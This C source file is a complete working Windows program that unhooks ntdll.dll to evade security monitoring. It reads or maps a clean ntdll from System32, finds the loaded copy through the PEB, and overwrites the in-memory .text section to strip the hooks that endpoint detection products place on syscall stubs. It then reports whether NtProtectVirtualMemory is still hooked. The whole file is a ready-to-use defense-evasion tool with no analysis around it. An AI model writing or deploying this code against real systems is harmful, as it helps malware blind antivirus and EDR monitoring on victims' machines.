#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#define NTDLL "NTDLL.DLL"

#define READ_NTDLL
#ifndef READ_NTDLL
//#define MAP_NTDLL
#endif // !READ_NTDLL

#ifdef READ_NTDLL
// Function reads NTDLL and holds the base address in ppNtdllBuffer
BOOL ReadNTDLL(_Out_ PVOID* ppNtdllBuffer) {
    
    CHAR cWinPath[MAX_PATH / 2]              = { 0 };        // Buffer to store the full path of the Windows directory
    CHAR cNtdllPath[MAX_PATH]                = { 0 };        // Buffer to store the full path of the NTDLL file
    HANDLE hFile                             = { 0 };        // Handle to the NTDLL file
    DWORD dwNumberOfBytesRead, dwFileLen     = { 0 };        // Variables to store the number of bytes read and the total file length
    PVOID pNtdllBuffer                       = { 0 };        // Pointer to the buffer that will store the content of the NTDLL file

    // Getting the full path of the Windows directory
    if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0) {
        printf("[!] GetWindowsDirectory Failed With Error Code: %d \n", GetLastError());
        // Jump to the cleanup section of the function
        goto _EndOfFunc;
    }

    // Constructing the full path of the NTDLL file
    sprintf_s(cNtdllPath, sizeof(cNtdllPath), "%s\\System32\\%s", cWinPath, NTDLL);

    // Opening the NTDLL file
    hFile = CreateFileA(cNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFile Failed With Error Code: %d \n", GetLastError());
        // Jump to the cleanup section of the function
        goto _EndOfFunc;
    }

    // Allocating memory to read the content of the NTDLL file
    dwFileLen = GetFileSize(hFile, NULL);
    pNtdllBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileLen);

    // Reading the content of the NTDLL file into the allocated buffer
    if (!ReadFile(hFile, pNtdllBuffer, dwFileLen, &dwNumberOfBytesRead, NULL) || dwFileLen != dwNumberOfBytesRead) {
        printf("[!] ReadFile Failed With Error : %d \n", GetLastError());
        printf("[+] Read %d of %d Bytes \n", dwNumberOfBytesRead, dwFileLen);
        // Jump to the cleanup section of the function
        goto _EndOfFunc;
    }

    // Setting the output parameter to point to the allocated buffer
    *ppNtdllBuffer = pNtdllBuffer;

_EndOfFunc:
    // Closing the file handle if it is open
    if (hFile) {
        CloseHandle(hFile);
    }

    // Checking if the buffer allocation was successful
    if (*ppNtdllBuffer == NULL) {
        // If buffer allocation failed, return FALSE
        return FALSE;
    }
    else {
        return TRUE;
    }
}
#endif // READ_NTDLL

#ifdef MAP_NTDLL
// Function reads NTDLL and holds the base address in ppNtdllBuffer
BOOL MapNtdll(_Out_ PVOID* ppNtdllBuffer) {
    HANDLE hFile = NULL;
    CHAR cWinPath[MAX_PATH / 2] = { 0 };        // Buffer to store the full path of the Windows directory
    CHAR cNtdllPath[MAX_PATH] = { 0 };        // Buffer to store the full path of the NTDLL file
    HANDLE hSection = { 0 };                // Handle to the NTDLL file
    PVOID pNtdllBuffer = { 0 };             // Pointer to the buffer that will store the content of the NTDLL file

    // Getting the full path of the Windows directory
    if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0) {
        printf("[!] GetWindowsDirectory Failed With Error Code: %d \n", GetLastError());
        // Jump to the cleanup section of the function
        goto _EndOfFunc;
    }

    // Constructing the full path of the NTDLL file
    sprintf_s(cNtdllPath, sizeof(cNtdllPath), "%s\\System32\\%s", cWinPath, NTDLL);

    // Opening the NTDLL file
    hFile = CreateFileA(cNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFile Failed With Error Code: %d \n", GetLastError());
        // Jump to the cleanup section of the function
        goto _EndOfFunc;
    }

    // Create a mapping view of ntdll
    hSection = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, NULL, NULL, NULL);
    if (!hSection) {
        printf("[!] CreateFileMappingA Failed With Error Code: %d \n", GetLastError());
        goto _EndOfFunc;
    }

    // Mapping ntdll file
    pNtdllBuffer = MapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL);
    if (!pNtdllBuffer) {
        printf("[!] MapViewOfFile Failed With Error Code: %d \n", GetLastError());
        goto _EndOfFunc;
    }

    // Setting the output parameter to point to the allocated buffer
    *ppNtdllBuffer = pNtdllBuffer;

_EndOfFunc:
    // Closing the file handle if it is open
    if (hFile) {
        CloseHandle(hFile);
    }
    if (hSection) {
        CloseHandle(hSection);
    }
    // Checking if the buffer allocation was successful
    if (*ppNtdllBuffer == NULL) {
        // If buffer allocation failed, return FALSE
        return FALSE;
    }
    else {
        return TRUE;
    }
}

#endif

PVOID FetchLocalNtdllBaseAddress() {
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif // _WIN64

    // Reaching to the 'ntdll.dll' module directly (we know its the 2nd image after 'DiskHooking.exe')
    // 0x10 is = sizeof(LIST_ENTRY)
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

    return pLdr->DllBase;
}

BOOL ReplaceNtdllTextSection(_In_ PVOID pUnhookNtdll) {
    PVOID pLocalNtdllTxt = NULL, pRemoteNtdllTxt = NULL; // local/remote hooked text section base address
    SIZE_T sNtdllTxtSize = 0;    // the size of the text section

    PVOID pLocalNtdll = (PVOID)FetchLocalNtdllBaseAddress();
    printf("[+] Hooked Ntdll Base Address: 0x%p \n[+] Unhooked Ntdll Base Address: 0x%p\n", pLocalNtdll, pUnhookNtdll);

    // Retrieve DOS Header
    PIMAGE_DOS_HEADER pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
    if (pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[!] Failed to retrieve DOS header\n");
        return FALSE;
    }

    // Retrieve NT Header
    PIMAGE_NT_HEADERS pLocalNtHdr = (PIMAGE_NT_HEADERS)((PBYTE)pLocalDosHdr + pLocalDosHdr->e_lfanew);
    if (pLocalNtHdr->Signature != IMAGE_NT_SIGNATURE) {
        printf("[!] Failed to retrieve NT header\n");
        return FALSE;
    }

    // Retrieve TXT Section
    // Macro: IMAGE_FIRST_SECTION to find the section table of the NT Header
    PIMAGE_SECTION_HEADER pSectionHdr = IMAGE_FIRST_SECTION(pLocalNtHdr);

    // Iterate through the number of sections that are present in the NT Header
    for (int i = 0; i < pLocalNtHdr->FileHeader.NumberOfSections; i++) {
        // the same as if( strcmp(pSectionHeader[i].Name, ".text") == 0 )
        if ((*(ULONG*)pSectionHdr[i].Name | 0x20202020) == 'xet.') {
            pLocalNtdllTxt = (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHdr[i].VirtualAddress);
            pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookNtdll + pSectionHdr[i].VirtualAddress);
            sNtdllTxtSize = pSectionHdr[i].Misc.VirtualSize;
            break;
        }
    }

    printf("\t[+] 'Hooked' Ntdll Text Section Address : 0x%p \n\t[+] 'Unhooked' Ntdll Text Section Address : 0x%p \n\t[+] Text Section Size : %d \n", pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

    // Small check to verify that all the required information is retrieved
    if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
        return FALSE;

#ifdef READ_NTDLL
    // Small check to verify that 'pRemoteNtdllTxt' is really the base address of the text section
    if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt) {
        printf("\t[i] Text section is of offset 4096, updating base address ... \n");
        // if not, then the read text section is also of offset 4096, so we add 3072 (because we added 1024 already)
        (ULONG_PTR)pRemoteNtdllTxt += 3072;
        // checking again
        if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
            return FALSE;
        printf("\t[+] New Address : 0x%p \n", pRemoteNtdllTxt);
        printf("[#] Press <Enter> To Continue ... ");
        getchar();
    }
#endif // READ_NTDLL

    printf("[+] Replacing TXT Section ...\n");
    DWORD dwOldProtect = NULL;

    // Make TXT Section writable (changeable)
    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtect)) {
        printf("[!] VirtualProtect Failed With Error Code: %d \n", GetLastError());
        return FALSE;
    }

    // Copy new TXT section
    memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

    // Restoring the old memory protection
    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtect, &dwOldProtect)) {
        printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[+] Changed TXT Section!\n");

    return TRUE;
}

VOID PrintState(char* cSyscallName, PVOID pSyscallAddress) {
    printf("[#] %s [ 0x%p ] ---> %s \n", cSyscallName, pSyscallAddress, (*(ULONG*)pSyscallAddress != 0xb8d18b4c) == TRUE ? "[ HOOKED ]" : "[ UNHOOKED ]");
}

int main() {
    PVOID pNtdll = NULL;

#ifdef MAP_NTDLL
    printf("[i] Fetching A New \"ntdll.dll\" File By Mapping \n");
    if (!MapNtdll(&pNtdll))
        return -1;
#endif // MAP_NTDLL

#ifdef READ_NTDLL
    printf("[i] Fetching A New \"ntdll.dll\" File By Reading \n");
    if (!ReadNTDLL(&pNtdll))
        return -1;
#endif // READ_NTDLL

    if (!ReplaceNtdllTextSection(pNtdll))
        return -1;

#ifdef MAP_NTDLL
    UnmapViewOfFile(pNtdll);
#endif // MAP_NTDLL

#ifdef READ_NTDLL
    HeapFree(GetProcessHeap(), 0, pNtdll);
#endif // READ_NTDLL

    printf("[+] Ntdll Unhooked Successfully \n");

    // Check if NtProtectVirtualMemory is unhooked
    PrintState("NtProtectVirtualMemory", GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtProtectVirtualMemory"));

    printf("[#] Press <Enter> To Quit ... ");
    getchar();

    return 0;
}